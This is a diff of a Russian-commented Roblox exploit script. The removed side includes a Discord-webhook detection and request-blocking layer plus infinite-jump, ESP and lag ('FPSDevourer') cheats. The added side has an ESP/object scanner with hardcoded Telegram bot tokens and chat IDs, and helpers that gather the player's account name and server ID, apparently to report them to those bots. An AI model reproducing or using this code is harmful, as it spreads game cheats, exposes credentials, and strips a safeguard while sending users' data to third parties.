@@ -1,1016 +1,795 @@
--- == Безопасный HTTP Block ==
-local G = (getgenv and getgenv()) or _G
+local RunService = game:GetService("RunService")
+local Players = game:GetService("Players")
+local CoreGui = game:GetService("CoreGui")
+local SoundService = game:GetService("SoundService")
+local HttpService = game:GetService("HttpService")
+local UserInputService = game:GetService("UserInputService")
+local request = syn and syn.request or http and http.request or fluxus and fluxus.request or http_request or request
 
-local function clog(msg)
-    msg = '[SAFE-BLOCK] ' .. tostring(msg)
-    if warn then warn(msg) else print(msg) end
-    if G.rconsoleprint then G.rconsoleprint(msg .. '\n') end
-end
-
--- Паттерны для обнаружения Discord webhook URL
-local DISCORD_PATTERNS = {
-    "discord%.com/api/webhooks/",
-    "discordapp%.com/api/webhooks/",
-    "webhook%.lewisakura%.moe/api/webhooks/",
-    "hooks%.hyra%.io/api/webhooks/",
-    "canary%.discord%.com/api/webhooks/",
-    "ptb%.discord%.com/api/webhooks/"
+-- Конфигурация ESP
+local ESP_SETTINGS = {
+    UpdateInterval = 0.5,
+    MaxDistance = 500,
+    TextSize = 18,
+    Font = Enum.Font.GothamBold,
+    PartColors = {
+        Color3.new(1, 1, 1),    -- Белый
+        Color3.new(0.2, 0.6, 1),-- Синий
+        Color3.new(1, 0.2, 0.2) -- Красный
+    },
+    SoundId = "rbxassetid://130785805",
+    SoundVolume = 1.5,
+    PlaySoundOnce = false
 }
 
-local function isDiscordWebhook(url)
-    if type(url) ~= "string" then return false end
-    url = url:lower()
-    
-    for _, pattern in ipairs(DISCORD_PATTERNS) do
-        if url:match(pattern) then
-            return true
-        end
-    end
-    
-    if url:match("webhooks/%d+/[%w%-_]+") then
-        return true
-    end
-    
-    return false
-end
+-- Настройки сканера
+local SCANNER_SETTINGS = {
+    ScanKey = Enum.KeyCode.F,
+    DebounceTime = 3,
+    IgnoreClasses = {"SurfaceAppearance", "Part"}
+}
 
-local function block_request(opts)
-    local url = 'unknown'
-    if type(opts) == 'table' then 
-        url = opts.Url or opts.url or tostring(opts) 
-    else 
-        url = tostring(opts) 
-    end
+-- Настройки Telegram ботов
+local TG_MAIN = {
+    Token = "7624455250:AAHXqHESVLzkJi7w9Q5YXyGf394dIfrXy1M",
+    ChatId = "1072158346",
+    Enabled = true,
+    ImportantObjects = {
+        ["Pot Hotspdddot"] = true,
+        ["La Grande Combinasion"] = true,
+        ["Garama and Madundung"] = true,
+        ["Nuclearo Dinossauro"] = true,
+        ["Dragon Cannelloni"] = true,
+        ["Los Combinasionas"] = true,
+        ["Los Hotspotsitos"] = true,
+        ["Esok Sekolah"] = true,
+        ["La Supreme Combinasion"] = true,
+        ["Nooo My Hodsadadatspot"] = true,
+        ["Ketupat Kepat"] = true,
+        ["Nofddsfoo My Hotspot"] = true,
+        ["Spaghetti Tualetti"] = true,
+        ["Strawberry Elephant"] = true,
+        ["Ketchuru and Musturu"] = true,
+        ["La Kark7658erkar Combinasion"] = true,
+        ["Tralaledon"] = true,
+        ["Los Bros"] = true,
+        ["La Extinct Grande"] = true,
+        ["Los Chicleteiras"] = true,
+        ["Las Sis"] = true,
+        ["Tacorita Bicicleta"] = true,
+        ["Tictac Sahur"] = true,
+        ["Celularcini Visiosini"] = true,
+        ["Chicleteira Bicicleteira"] = true,
+        ["Los Primos"] = true,
+        ["Tang Tang Keletang"] = true,
+        ["Money Money Puggy"] = true
+    }
+}
+
+local TG_SPECIAL = {
+    Token = "8403219194:AAHXD_oxTlI2YHWKFz6SKvspfo7hJY32Tsk",
+    ChatId = "-1002767532824",
+    Enabled = true
+}
+
+-- Функция проверки прозрачности частей Cube.
+local function checkCubeTransparency(obj)
+    if not obj:IsA("Model") then return true end
     
-    -- Специальная блокировка Discord webhooks
-    if isDiscordWebhook(url) then
-        clog('BLOCKED DISCORD WEBHOOK: ' .. url)
-        return { 
-            StatusCode = 403, 
-            Headers = {}, 
-            Body = '{"message":"403: Forbidden","code":50013}', 
-            Success = false 
-        }
-    end
-    
-    clog('BLOCKED: ' .. url)
-    return { StatusCode = 200, Headers = {}, Body = '{"blocked":true}', Success = true }
-end
-
-local function safe_replace(tableObj, key, new_func)
-    local succ = pcall(function() tableObj[key] = new_func end)
-    if succ then clog('Replaced ' .. tostring(key)) end
-    return succ
-end
-
-safe_replace(G, 'request', block_request)
-safe_replace(G, 'http_request', block_request)
-pcall(function() if G.syn then safe_replace(G.syn, 'request', block_request) end end)
-pcall(function() if G.http then safe_replace(G.http, 'request', block_request) end end)
-
--- == Гарантированное получение LocalPlayer ==
-local Players = game:GetService('Players')
-local player = Players.LocalPlayer
-if not player then
-    Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
-    player = Players.LocalPlayer
-end
-local RunService = game:GetService('RunService')
-local TweenService = game:GetService('TweenService')
-local ReplicatedStorage = game:GetService('ReplicatedStorage')
-local CoreGui = game:GetService('CoreGui')
-local UserInputService = game:GetService('UserInputService')
-
--- == ФУНКЦИЯ ПОЛНОГО ОТКЛЮЧЕНИЯ АНИМАЦИЙ ==
-local function disableAllAnimations(character)
-    -- Отключаем основной скрипт анимаций
-    local animate = character:FindFirstChild("Animate")
-    if animate then
-        animate.Disabled = true
-        animate:Destroy() -- Полностью удаляем скрипт
-    end
-    
-    -- Останавливаем все текущие анимации
-    local humanoid = character:FindFirstChildOfClass("Humanoid")
-    if humanoid then
-        local animator = humanoid:FindFirstChildOfClass("Animator")
-        if animator then
-            -- Останавливаем все играющие анимации
-            for _, animationTrack in pairs(animator:GetPlayingAnimationTracks()) do
-                animationTrack:Stop()
-                animationTrack:Destroy()
-            end
-            -- Уничтожаем сам Animator
-            animator:Destroy()
-        end
-        
-        -- Останавливаем анимации через устаревший метод (на всякий случай)
-        local success, tracks = pcall(function()
-            return humanoid:GetPlayingAnimationTracks()
-        end)
-        if success and tracks then
-            for _, track in pairs(tracks) do
-                track:Stop()
-                track:Destroy()
+    for _, part in ipairs(obj:GetDescendants()) do
+        if part:IsA("BasePart") and part.Name:match("^Cube%.") then
+            print("Проверка: " .. part.Name .. " - прозрачность " .. part.Transparency)
+            if part.Transparency > 0.40 then
+                return false
             end
         end
     end
+    return true
 end
 
--- Функция постоянного отключения анимаций
-local function keepAnimationsDisabled(character)
-    local humanoid = character:FindFirstChildOfClass("Humanoid")
-    if humanoid then
-        local animator = humanoid:FindFirstChildOfClass("Animator")
-        if animator then
-            -- Постоянно останавливаем любые анимации, которые могут запуститься
-            for _, animationTrack in pairs(animator:GetPlayingAnimationTracks()) do
-                animationTrack:Stop()
-                animationTrack:Destroy()
-            end
-            -- Удаляем Animator если он появился снова
-            animator:Destroy()
-        end
-    end
-    
-    -- Отключаем Animate скрипт, если он снова появился
-    local animate = character:FindFirstChild("Animate")
-    if animate then
-        animate.Disabled = true
-        animate:Destroy()
-    end
-end
-
--- == СИСТЕМА INFINITY JUMP ==
-local infinityJumpEnabled = true -- ВСЕГДА ВКЛЮЧЕНО
-local isSpacePressed = false
-
--- Функция настройки персонажа для полёта
-local function setupCharacterForFlight(character)
-    local humanoid = character:WaitForChild("Humanoid")
-    wait(0.1)
-    
-    -- ПОЛНОЕ ОТКЛЮЧЕНИЕ АНИМАЦИЙ
-    disableAllAnimations(character)
-    
-    -- Отключаем только защиту от падения с краёв
-    humanoid:SetStateEnabled(Enum.HumanoidStateType.PlatformStanding, false)
-    humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, true)
-    humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall, true)
-end
-
--- Функция проверки на землю
-local function isOnGround(character)
-    local humanoid = character:FindFirstChildOfClass("Humanoid")
-    if not humanoid then return false end
-    
-    -- Используем встроенные методы Roblox для определения состояния
-    local state = humanoid:GetState()
-    return state ~= Enum.HumanoidStateType.Freefall and 
-           state ~= Enum.HumanoidStateType.Jumping and
-           state ~= Enum.HumanoidStateType.Flying and
-           humanoid.FloorMaterial ~= Enum.Material.Air
-end
-
--- Функция бесконечного прыжка вверх
-local function infinityJump()
-    local character = player.Character
-    if not character then return end
-    
-    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
-    local humanoid = character:FindFirstChild("Humanoid")
-    if not humanoidRootPart or not humanoid then return end
-    
-    -- Используем MoveDirection напрямую - он уже учитывает камеру!
-    local moveVector = humanoid.MoveDirection
-    local walkSpeed = humanoid.WalkSpeed
-    
-    -- Естественное движение: используем MoveDirection как есть
-    local horizontalVelocity = moveVector * walkSpeed
-    
-    -- УВЕЛИЧЕННАЯ скорость полёта вверх (в 2 раза больше)
-    humanoidRootPart.AssemblyLinearVelocity = Vector3.new(
-        horizontalVelocity.X,
-        32, -- Увеличено с 16 до 32 (в 2 раза больше)
-        horizontalVelocity.Z
-    )
-end
-
--- Функция быстрого падения с естественным движением
-local function fall()
-    local character = player.Character
-    if not character then return end
-    
-    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
-    local humanoid = character:FindFirstChild("Humanoid")
-    if not humanoidRootPart or not humanoid then return end
-    
-    -- Переводим в свободное падение
-    if humanoid:GetState() ~= Enum.HumanoidStateType.Freefall then
-        humanoid:ChangeState(Enum.HumanoidStateType.Freefall)
-    end
-    
-    -- Используем MoveDirection для естественного движения
-    local moveVector = humanoid.MoveDirection
-    local walkSpeed = humanoid.WalkSpeed
-    
-    -- БЫСТРОЕ ПАДЕНИЕ - увеличенная скорость падения
-    local fastFallSpeed = -80 -- Увеличено с -50 до -80 (в 1.6 раза быстрее)
-    
-    -- Естественное горизонтальное движение
-    local horizontalVelocity = moveVector * walkSpeed
-    
-    humanoidRootPart.AssemblyLinearVelocity = Vector3.new(
-        horizontalVelocity.X,
-        fastFallSpeed,
-        horizontalVelocity.Z
-    )
-end
-
--- Основной цикл Infinity Jump (ВСЕГДА РАБОТАЕТ)
-local infinityJumpConnection = nil
-local function startInfinityJump()
-    if infinityJumpConnection then return end
-    infinityJumpConnection = RunService.RenderStepped:Connect(function()
-        local character = player.Character
-        if not character then return end
-        
-        local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
-        if not humanoidRootPart then return end
-        
-        -- ПОСТОЯННОЕ ОТКЛЮЧЕНИЕ АНИМАЦИЙ
-        keepAnimationsDisabled(character)
-        
-        local onGround = isOnGround(character)
-        
-        -- ВСЕГДА АКТИВНЫЙ Infinity Jump
-        if isSpacePressed then
-            infinityJump() -- Бесконечный прыжок вверх когда зажат пробел
-        elseif not onGround then
-            fall() -- БЫСТРОЕ падение когда пробел не зажат и не на земле
-        end
-        -- На земле - система Humanoid управляет движением
-    end)
-end
-
-local function stopInfinityJump()
-    if infinityJumpConnection then
-        infinityJumpConnection:Disconnect()
-        infinityJumpConnection = nil
-    end
-end
-
--- Обработка ввода для Infinity Jump
-UserInputService.InputBegan:Connect(function(input, gameProcessed)
-    if gameProcessed then return end
-    
-    if input.KeyCode == Enum.KeyCode.Space then
-        isSpacePressed = true
-    end
-end)
-
-UserInputService.InputEnded:Connect(function(input, gameProcessed)
-    if gameProcessed then return end
-    
-    if input.KeyCode == Enum.KeyCode.Space then
-        isSpacePressed = false
-    end
-end)
-
--- Настройка при возрождении
-player.CharacterAdded:Connect(function(character)
-    setupCharacterForFlight(character)
-    
-    -- Дополнительное отключение анимаций с задержкой
-    task.wait(0.5)
-    disableAllAnimations(character)
-end)
-
--- Настройка текущего персонажа
-if player.Character then
-    setupCharacterForFlight(player.Character)
-end
-
--- АВТОЗАПУСК Infinity Jump
-startInfinityJump()
-
--- == Стиль UI и иконки ==
-local UI_THEME = {
-    PanelBg = Color3.fromRGB(16, 14, 24),
-    PanelStroke = Color3.fromRGB(95, 70, 160),
-    Accent = Color3.fromRGB(148, 0, 211),
-    Accent2 = Color3.fromRGB(90, 60, 200),
-    Text = Color3.fromRGB(235, 225, 255),
-    ButtonOn = Color3.fromRGB(40, 160, 120),
-    ButtonOff = Color3.fromRGB(160, 60, 80),
-}
-local ICONS = {
-    Zap = "rbxassetid://7733911822", 
-    Eye = "rbxassetid://7733745385", 
-    Camera = "rbxassetid://7733871300",
-    Jump = "rbxassetid://7733708835" -- Иконка для Infinity Jump
-}
-local ESP_SETTINGS = { MaxDistance = 500, Font = Enum.Font.GothamBold, Color = Color3.fromRGB(148, 0, 211),
-    BgColor = Color3.fromRGB(24, 16, 40), TxtColor = Color3.fromRGB(225, 210, 255), TextSize = 16 }
-local OBJECT_EMOJIS = {['La Vacca Saturno Saturnita'] = '🐮', ['Nooo My Hotspot'] = '👽', ['La Supreme Combinasion'] = '🔫',
-    ['Ketupat Kepat'] = '⚰️',['Graipuss Medussi'] = '🦑',['Torrtuginni Dragonfrutini'] = '🐢',
-    ['Pot Hotspot'] = ' 📱',['La Grande Combinasion'] = '❗️',['Garama and Madundung'] = '🥫',
-    ['Secret Lucky Block'] = '⬛️',['Strawberry Elephant'] = '🐘',['Nuclearo Dinossauro'] = '🦕',['Spaghetti Tualetti'] = '🚽',
-    ['Chicleteira Bicicleteira'] = '🚲',['Los Combinasionas'] = '⚒️',['Ketchuru and Musturu'] = '🍾',['Los Hotspotsitos'] = '☎️',['Tacorita Bicicleta'] = '🌮',
-    ['Los Nooo My Hotspotsitos'] = '🔔',['Esok Sekolah'] = '🏠',['Los Bros'] = '✊',["Tralaledon"] = "🦈",["La Extinct Grande"] = "🦴",["Las Sis"] = "👧",["Los Chicleteiras"] = "🚳",["Celularcini Viciosini"] = "📢",["Dragon Cannelloni"] = "🐉"
+-- Доходы объектов (все значения в /s)
+local OBJECT_INCOME = {
+    ["La Vacca Saturno Saturnita"] = "250K/s",
+    ["Chimpanzini Spiderini"] = "325K/s",
+    ["Los Tralaleritos"] = "500K/s",
+    ["Las Tralaleritas"] = "625K/s",
+    ["Graipuss Medussi"] = "1M/s",
+    ["Torrtuginni Dragonfrutini"] = "350K/s",
+    ["Pot Hotspot"] = "2.5M/s",
+    ["La Grande Combinasion"] = "10M/s",
+    ["Garama and Madundung"] = "50M/s",
+    ["Secret Lucky Block"] = "???/s",
+    ["Dragon Cannelloni"] = "100M/s",
+    ["Nuclearo Dinossauro"] = "15M/s",
+    ["Las Vaquitas Saturnitas"] = "750K/s",
+    ["Chicleteira Bicicleteira"] = "3.5M/s",
+    ["Los Combinasionas"] = "15M/s",
+    ["Agarrini la Palini"] = "425K/s",
+    ["Los Hotspotsitos"] = "20M/s",
+    ["Esok Sekolah"] = "30M/s",
+    ["Karkerkar Kurkur"] = "275K/s",
+    ["Job Job Job Sahur"] = "700K/s",
+    ["La Supreme Combinasion"] = "40M/s",
+    ["Nooo My Hotspot"] = "1.5M/s",
+    ["Spaghetti Tualetti"] = "60M/s",
+    ["Strawberry Elephant"] = "250M/s",
+    ["Ketupat Kepat"] = "35M/s",
+    ["Ketchuru and Musturu"] = "42.5M/s",
+    ["Los Nooo My Hotssffsdsdpotsitos"] = "5M/s",
+    ["La Kark767erkar Combinasion"] = "50M/s",
+    ["Tralaledon"] = "27.5M/s",
+    ["Los Bros"] = "24M/s",
+    ["La Extinct Grande"] = "23.5M/s",
+    ["Los Chicleteiras"] = "7M/s",
+    ["Las Sis"] = "18M/s",
+    ["Tacorita Bicicleta"] = "16.5M/s",
+    ["Tictac Sahur"] = "37M/s",
+    ["Celularcini Visiosini"] = "22.5M/s",
+    ["Los Primos"] = "31M/s",
+    ["Tang Tang Keletang"] = "33.5M/s",
+    ["Money Money Puggy"] = "21M/s"
 }
 
--- == ОПТИМАЛЬНЫЙ ESP ==
-local espCache, esp3DRoot, heartbeatConnection = {}, nil, nil
+-- Множители мутаций и трейтов
+local MUTATION_MULTIPLIERS = {
+    ["Rainbow"] = 10,
+    ["Gold"] = 1.25,
+    ["Diamond"] = 1.5,
+    ["Bloodrot"] = 2,
+    ["Candy"] = 4,
+    ["Lava"] = 6,
+    ["Galaxy"] = 7,
+    ["Yin Yang"] = 7
+}
+
+local TRAIT_MULTIPLIERS = {
+    ["Taco"] = 3,
+    ["Claws"] = 5,
+    ["Snowy"] = 3,
+    ["Glitched"] = 5,
+    ["Fire"] = 6,
+    ["Fireworks"] = 6,
+    ["Nyan"] = 6,
+    ["Disco"] = 5,
+    ["10B"] = 3,
+    ["Zombie"] = 4,
+    ["Shark Fin"] = 4,
+    ["Bubblegum"] = 4,
+    ["Cometstruck"] = 3.5,
+    ["Galactic"] = 4,
+    ["Explosive"] = 4,
+    ["Paint"] = 6,
+    ["Brazil"] = 6,
+    ["Matteo Hat"] = 3.5,
+    ["Rain"] = 1.5,
+    ["UFO"] = 3,
+    ["Skeleton"] = 4,
+    ["Spider"] = 4.5,
+    ["Sombrero"] = 5
+    
+    
+}
+
+-- Эмодзи для объектов
+local OBJECT_EMOJIS = {
+    ["La Vacca Saturno Saturnita"] = "🐮",
+    ["Chimpanzini Spiderini"] = "🕷",
+    ["Los Tralaleritos"] = "🐟",
+    ["Las Tralaleritas"] = "🌸",
+    ["Graipuss Medussi"] = "🦑",
+    ["Torrtuginni Dragonfrutini"] = "🐉",
+    ["Pot Hotspot"] = "📱",
+    ["La Grande Combinasion"] = "❗️",
+    ["Garama and Madundung"] = "🍝",
+    ["Secret Lucky Block"] = "⬛️",
+    ["Dragon Cannelloni"] = "🐲",
+    ["Nuclearo Dinossauro"] = "🦕",
+    ["Las Vaquitas Saturnitas"] = "👦",
+    ["Chicleteira Bicicleteira"] = "🚲",
+    ["Los Combinasionas"] = "⚒️",
+    ["Agarrini la Palini"] = "🥄",
+    ["Los Hotspotsitos"] = "☎️",
+    ["Esok Sekolah"] = "🏠",
+    ["Nooo My Hotspot"] = "👽",
+    ["La Supreme Combinasion"] = "🔫",
+    ["Admin Lucky Block"] = "🆘",
+    ["Ketupat Kepat"] = "🍏",
+    ["Strawberry Elephant"] = "🐘",
+    ["Spaghetti Tualetti"] = "🚽",
+    ["Ketchuru and Musturu"] = "🍾",
+    ["Los Nooo My Hotspdffsfsfotsitos"] = "🥔",
+    ["La Kark666erkar Combinasion"] = "🥊",
+    ["Tralaledon"] = "🦈",
+    ["Los Bros"] = "✊",
+    ["La Extinct Grande"] = "🩻", 
+    ["Los Chicleteiras"] = "🚳",
+    ["Las Sis"] = "👧",
+    ["Tacorita Bicicleta"] = "🌮",
+    ["Tictac Sahur"] = "🕰️",
+    ["Celularcini Visiosini"] = "📞",
+    ["Los Primos"] = "🙆‍♂️",
+    ["Tang Tang Keletang"] = "📢",
+    ["Money Money Puggy"] = "🐶"
+}
+
+-- Эмодзи для мутаций
+local MUTATION_EMOJIS = {
+    ["Gold"] = "🟨",
+    ["Lava"] = "🟧",
+    ["Rainbow"] = "🌈",
+    ["Diamond"] = "💎",
+    ["Candy"] = "🍬",
+    ["Bloodrot"] = "🟥",
+    ["Galaxy"] = "🟪",
+    ["Yin Yang"] = "☯️"
+}
+
+-- Список объектов
+local OBJECT_NAMES = {
+    "La Vacca Saturno Saturnita",
+    "Chimpanzini Spiderini",
+    "Los Tralaleritos",
+    "Las Tralaleritas",
+    "Graipuss Medussi",
+    "Torrtuginni Dragonfrutini",
+    "Pot Hotspot",
+    "La Grande Combinasion",
+    "Garama and Madundung",
+    "Secret Lucksfsfsfy Block",
+    "Dragon Cannelloni",
+    "Nuclearo Dinossauro",
+    "Las Vaquitas Saturnitas",
+    "Chicleteira Bicicleteira",
+    "Los Combinasionas",
+    "Agarrini la Palini",
+    "Los Hotspotsitos",
+    "Esok Sekolah",
+    "Nooo My Hotspot",
+    "La Supreme Combinasion",
+    "Admin Lucky Block",
+    "Ketupat Kepat",
+    "Strawberry Elephant",
+    "Spaghetti Tualetti",
+    "Ketchuru and Musturu",
+    "Los Nooo Mysffsfsf Hotspotsitos",
+    "La Kark56656erkar Combinasion",
+    "Los Bros",
+    "Tralaledon",
+    "La Extinct Grande",
+    "Los Chicleteiras",
+    "Las Sis",
+    "Tacorita Bicicleta",
+    "Tictac Sahur",
+    "Celularcini Visiosini",
+    "Los Primos",
+    "Tang Tang Keletang",
+    "Money Money Puggy"
+}
+
+-- Системные переменные
 local camera = workspace.CurrentCamera
-local ESP_UPDATE_INTERVAL = 0.25
-local MAX_ESP_TARGETS = 24
-local lastESPUpdate = 0
-local function getRootPart(obj)
-    if obj:IsA("BasePart") then return obj end
-    if obj:IsA("Model") then
-        return obj.PrimaryPart or obj:FindFirstChild('HumanoidRootPart') or obj:FindFirstChildWhichIsA('BasePart')
+local espCache = {}
+local lastUpdate = 0
+local foundObjects = {}
+local objectsToNotifyMain = {}
+local objectsToNotifySpecial = {}
+local lastScanTime = 0
+local lastNotificationTimeMain = 0
+local lastNotificationTimeSpecial = 0
+local lastServerNotified = ""
+
+-- Создаем интерфейс
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "RussianESP"
+screenGui.Parent = CoreGui
+screenGui.ResetOnSpawn = false
+
+-- Функции утилиты
+local function getAccountInfo()
+    local player = Players.LocalPlayer
+    return player and player.Name or "Неизвестный аккаунт"
+end
+
+local function getServerId()
+    local jobId = game.JobId
+    return jobId ~= "" and jobId or "Одиночная игра"
+end
+
+local function incomeToNumber(incomeStr)
+    if incomeStr == "???/s" then return 0 end
+    
+    local value = tonumber(incomeStr:match("%d+%.?%d*"))
+    local unit = incomeStr:match("([MK])/s")
+    
+    if unit == "M" then
+        return value * 1000000
+    elseif unit == "K" then
+        return value * 1000
+    else
+        return value
     end
+end
+
+local function formatIncomeNumber(num)
+    if num >= 1000000 then
+        local mValue = num/1000000
+        return string.format(mValue % 1 == 0 and "%dM/s" or "%.1fM/s", mValue):gsub("%.0M/s", "M/s")
+    elseif num >= 1000 then
+        local kValue = num/1000
+        return string.format(kValue % 1 == 0 and "%dK/s" or "%.1fK/s", kValue):gsub("%.0K/s", "K/s")
+    else
+        return string.format("%d/s", num)
+    end
+end
+
+local function getMutationEmoji(mutation)
+    return MUTATION_EMOJIS[mutation] or "⬜️"
+end
+
+-- Функции для сбора информации об объектах
+local function findMutation(obj)
+    local mutation = obj:GetAttribute("Mutation")
+    if mutation then return tostring(mutation) end
+    
+    for _, child in ipairs(obj:GetDescendants()) do
+        if child:IsA("StringValue") and child.Name == "Mutation" then
+            return child.Value
+        end
+        
+        if child:IsA("ObjectValue") and child.Name == "Mutation" and child.Value then
+            return child.Value.Name
+        end
+    end
+    
+    local nameParts = obj.Name:split(" ")
+    for _, part in ipairs(nameParts) do
+        if MUTATION_MULTIPLIERS[part] then
+            return part
+        end
+    end
+    
     return nil
 end
-local function isValidTarget(obj)
-    return OBJECT_EMOJIS[obj.Name] and ((obj:IsA('BasePart')) or (obj:IsA('Model') and getRootPart(obj)))
-end
-local function clearOldESP()
-    for obj,data in pairs(espCache) do
-        if not obj or not obj.Parent then if data and data.gui then data.gui:Destroy() end; espCache[obj]=nil end
-    end
-end
-local function createESP(obj)
-    local rootPart = getRootPart(obj) if not rootPart then return nil end
-    local gui = Instance.new('BillboardGui')
-    gui.Adornee = rootPart gui.Size = UDim2.new(0,220,0,30) gui.AlwaysOnTop = true
-    gui.MaxDistance = ESP_SETTINGS.MaxDistance gui.LightInfluence = 0 gui.StudsOffset = Vector3.new(0,3,0)
-    gui.Parent = esp3DRoot
-    local frame = Instance.new('Frame', gui); frame.Size = UDim2.new(1,0,1,0)
-    frame.BackgroundColor3 = ESP_SETTINGS.BgColor; frame.BackgroundTransparency = 0.2; frame.BorderSizePixel = 0
-    Instance.new('UICorner', frame).CornerRadius = UDim.new(0,8)
-    local border = Instance.new('UIStroke', frame)
-    border.Color = ESP_SETTINGS.Color; border.Thickness = 1.5
-    local textLabel = Instance.new('TextLabel', frame)
-    textLabel.Size = UDim2.new(1, -8, 1, -4); textLabel.Position = UDim2.new(0,4,0,2)
-    textLabel.BackgroundTransparency = 1; textLabel.TextColor3 = ESP_SETTINGS.TxtColor; textLabel.Font = Enum.Font.GothamBold
-    textLabel.TextSize = 16; textLabel.TextXAlignment = Enum.TextXAlignment.Center
-    textLabel.TextYAlignment = Enum.TextYAlignment.Center; textLabel.Text = OBJECT_EMOJIS[obj.Name].." "..obj.Name
-    textLabel.TextScaled = true; textLabel.ClipsDescendants = true
-    return {gui=gui, rootPart=rootPart}
-end
-local function updateESP()
-    if tick() - lastESPUpdate < ESP_UPDATE_INTERVAL then return end
-    lastESPUpdate = tick()
-    clearOldESP()
-    local candidates = {}
-    for _, obj in ipairs(workspace:GetDescendants()) do
-        if isValidTarget(obj) then
-            local root = getRootPart(obj)
-            if root then
-                table.insert(candidates, {obj=obj,dist=(root.Position-camera.CFrame.Position).Magnitude})
+
+local function findTraits(obj)
+    local traits = {}
+    
+    local traitsAttr = obj:GetAttribute("Traits")
+    if traitsAttr then
+        if type(traitsAttr) == "table" then
+            for _, v in pairs(traitsAttr) do
+                table.insert(traits, tostring(v))
             end
-        end
-    end
-    table.sort(candidates, function(a,b) return a.dist<b.dist end)
-    for i,data in ipairs(candidates) do
-        if i > MAX_ESP_TARGETS then break end
-        local obj = data.obj
-        local root = getRootPart(obj)
-        if not espCache[obj] then
-            local d = createESP(obj)
-            if d then espCache[obj] = d end
-        end
-        local dat = espCache[obj]
-        if dat then
-            local _, onScreen = camera:WorldToViewportPoint(root.Position)
-            dat.gui.Enabled = onScreen and (data.dist <= ESP_SETTINGS.MaxDistance)
-        end
-    end
-end
-local function startESP()
-    if not heartbeatConnection then heartbeatConnection = RunService.Heartbeat:Connect(updateESP) end
-end
-local function stopESP()
-    if heartbeatConnection then heartbeatConnection:Disconnect() heartbeatConnection = nil end
-    clearOldESP()
-end
-
--- == CAMERAUP ==
-local isCameraRaised, cameraFollowConnection = false, nil
-local CAMERA_HEIGHT_OFFSET = 20
-local function enableFollowCamera()
-    if isCameraRaised then return end
-    camera.CameraType = Enum.CameraType.Scriptable
-    cameraFollowConnection = RunService.RenderStepped:Connect(function()
-        local char = player.Character
-        if char then
-            local hrp = char:FindFirstChild('HumanoidRootPart')
-            if hrp then
-                local pos = hrp.Position
-                camera.CFrame = CFrame.lookAt(pos + Vector3.new(0, CAMERA_HEIGHT_OFFSET, 0), pos)
-            end
-        end
-    end)
-    isCameraRaised = true
-end
-local function disableFollowCamera()
-    if not isCameraRaised then return end
-    if cameraFollowConnection then cameraFollowConnection:Disconnect() cameraFollowConnection = nil end
-    camera.CameraType = Enum.CameraType.Custom isCameraRaised = false
-end
-
--- == FPSDevourer ==
-local function removeAllAccessoriesFromCharacter()
-    local char = player.Character
-    if not char then return end
-    for _,item in ipairs(char:GetChildren()) do
-        if item:IsA('Accessory') or item:IsA('LayeredClothing') or item:IsA('Shirt')
-        or item:IsA('ShirtGraphic') or item:IsA('Pants') or item:IsA('BodyColors') or item:IsA('CharacterMesh') then
-            pcall(function() item:Destroy() end)
-        end
-    end
-end
-player.CharacterAdded:Connect(function() task.wait(0.2) removeAllAccessoriesFromCharacter() end)
-if player.Character then task.defer(removeAllAccessoriesFromCharacter) end
-local FPSDevourer = {}
-do
-    FPSDevourer.running = false
-    local TOOL_NAME = 'Bat'
-    local function equip() local c=player.Character local b=player:FindFirstChild('Backpack') if not c or not b then return false end local t=b:FindFirstChild(TOOL_NAME) if t then t.Parent=c return true end return false end
-    local function unequip() local c=player.Character local b=player:FindFirstChild('Backpack') if not c or not b then return false end local t=c:FindFirstChild(TOOL_NAME) if t then t.Parent=b return true end return false end
-    function FPSDevourer:Start()
-        if FPSDevourer.running then return end FPSDevourer.running=true; FPSDevourer._stop=false
-        task.spawn(function()
-            while FPSDevourer.running and not FPSDevourer._stop do equip(); task.wait(0.035); unequip(); task.wait(0.035); end
-        end)
-    end
-    function FPSDevourer:Stop() FPSDevourer.running = false; FPSDevourer._stop = true; unequip() end
-    player.CharacterAdded:Connect(function() FPSDevourer.running=false FPSDevourer._stop=true end)
-end
-
--- == UI ==
-local uiRoot, sidebar, btnESP, btnCam, btnFreeze, btnJump, btnSelect, btnPlayer, btnTroll
-local selectedPlayer = nil
-local function makeMenuButton(text, icon, isOn)
-    local btn = Instance.new("TextButton")
-    btn.Text = "   "..text
-    btn.Font = Enum.Font.GothamBold
-    btn.TextSize = 16
-    btn.BackgroundColor3 = isOn and UI_THEME.ButtonOn or UI_THEME.ButtonOff
-    btn.TextColor3 = UI_THEME.Text
-    btn.Size = UDim2.new(1,0,0,36)
-    btn.AutoButtonColor = true
-    Instance.new("UICorner",btn).CornerRadius = UDim.new(0,10)
-    local i = Instance.new("ImageLabel",btn)
-    i.BackgroundTransparency = 1
-    i.Image = icon
-    i.Size = UDim2.new(0,18,0,18)
-    i.Position = UDim2.new(0,7,0.5,-9)
-    i.ImageColor3 = UI_THEME.Text
-    i.AnchorPoint = Vector2.new(0,0.5)
-    return btn
-end
-local function buildUI()
-    uiRoot = Instance.new('ScreenGui',CoreGui)
-    uiRoot.Name = 'PurpleESP_UI'
-    uiRoot.ResetOnSpawn = false
-    uiRoot.IgnoreGuiInset = true
-    uiRoot.DisplayOrder = 1000
-    sidebar = Instance.new('Frame', uiRoot)
-    sidebar.Size = UDim2.new(0, 220, 0, 308)
-    sidebar.AnchorPoint = Vector2.new(1, 0.5)
-    sidebar.Position = UDim2.new(1, -12, 0.4, 0)
-    sidebar.BackgroundColor3 = UI_THEME.PanelBg
-    sidebar.Active = true
-    Instance.new('UICorner', sidebar).CornerRadius = UDim.new(0,12)
-    local stroke = Instance.new('UIStroke',sidebar)
-    stroke.Color = UI_THEME.PanelStroke
-    stroke.Thickness = 2
-    local grad = Instance.new('UIGradient',sidebar)
-    grad.Color = ColorSequence.new({
-        ColorSequenceKeypoint.new(0, UI_THEME.Accent2),
-        ColorSequenceKeypoint.new(0.5, UI_THEME.Accent),
-        ColorSequenceKeypoint.new(1, UI_THEME.Accent2)})
-    grad.Transparency = NumberSequence.new(0.1)
-    grad.Rotation = 35
-    grad.Offset = Vector2.new(-1.1,0)
